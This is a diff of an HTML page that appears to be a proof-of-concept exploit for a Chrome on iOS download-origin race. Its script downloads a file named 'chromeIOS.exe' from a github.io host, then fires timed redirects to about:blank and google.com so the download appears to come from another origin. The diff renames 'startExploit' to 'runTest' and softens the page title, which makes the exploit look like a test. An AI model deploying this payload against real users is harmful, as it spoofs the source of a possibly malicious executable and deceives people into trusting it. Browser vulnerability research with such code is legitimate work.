@@ -4,63 +4,70 @@
 <meta charset="utf-8">
 
 <style>
+body{
+  font-family:Arial;
+  text-align:center;
+  margin-top:120px;
+}
+
 .button{
   background:#4CAF50;
   border:none;
   color:white;
-  padding:16px 32px;
-  font-size:16px;
+  padding:16px 36px;
+  font-size:18px;
   cursor:pointer;
 }
 </style>
 
 <script>
 
-const FILE_URL="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
+const FILE="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
 
-function startExploit(){
+function runTest(){
 
-  console.log("Starting race condition test");
+  console.log("Triggering download");
 
-  triggerDownload();
+  startDownload();
 
-  // banyak timing untuk memperbesar peluang race
-  const delays=[120,180,220,260,300,320,350,380,420];
+  // beberapa timing race window
+  const timings=[150,200,240,280,320,360];
 
-  delays.forEach((d,i)=>{
+  timings.forEach((t)=>{
     setTimeout(()=>{
-      redirectChain();
-    },d);
+      redirectStep();
+    },t);
   });
 
 }
 
-function triggerDownload(){
+function startDownload(){
 
-  const link=document.createElement("a");
-  link.href=FILE_URL;
-  link.download="chromeIOS.exe";
+  let a=document.createElement("a");
+  a.href=FILE;
+  a.download="chromeIOS.exe";
 
-  document.body.appendChild(link);
+  document.body.appendChild(a);
 
-  // trigger click async
+  // trigger click setelah frame berikutnya
   requestAnimationFrame(()=>{
-    link.click();
-    document.body.removeChild(link);
+    a.click();
+    a.remove();
   });
 
 }
 
-function redirectChain(){
+function redirectStep(){
 
-  console.log("Redirect step");
+  console.log("Redirect sequence");
 
-  // redirect bertahap untuk mengacaukan state navigation
+  // tahap pertama
   location.href="about:blank";
 
+  // tahap kedua
   setTimeout(()=>{
     location.replace("https://google.com");
-  },40);
+  },50);
 
 }
 
@@ -70,17 +77,13 @@ function redirectChain(){
 
 <body>
 
-<center>
-
-<h2>Chrome iOS Download Origin Race Test</h2>
+<h2>Chrome iOS Download Origin Test</h2>
 
 <br>
 
-<button class="button" onclick="startExploit()">
-Start Download
+<button class="button" onclick="runTest()">
+Start Download Test
 </button>
-
-</center>
 
 </body>
 </html>
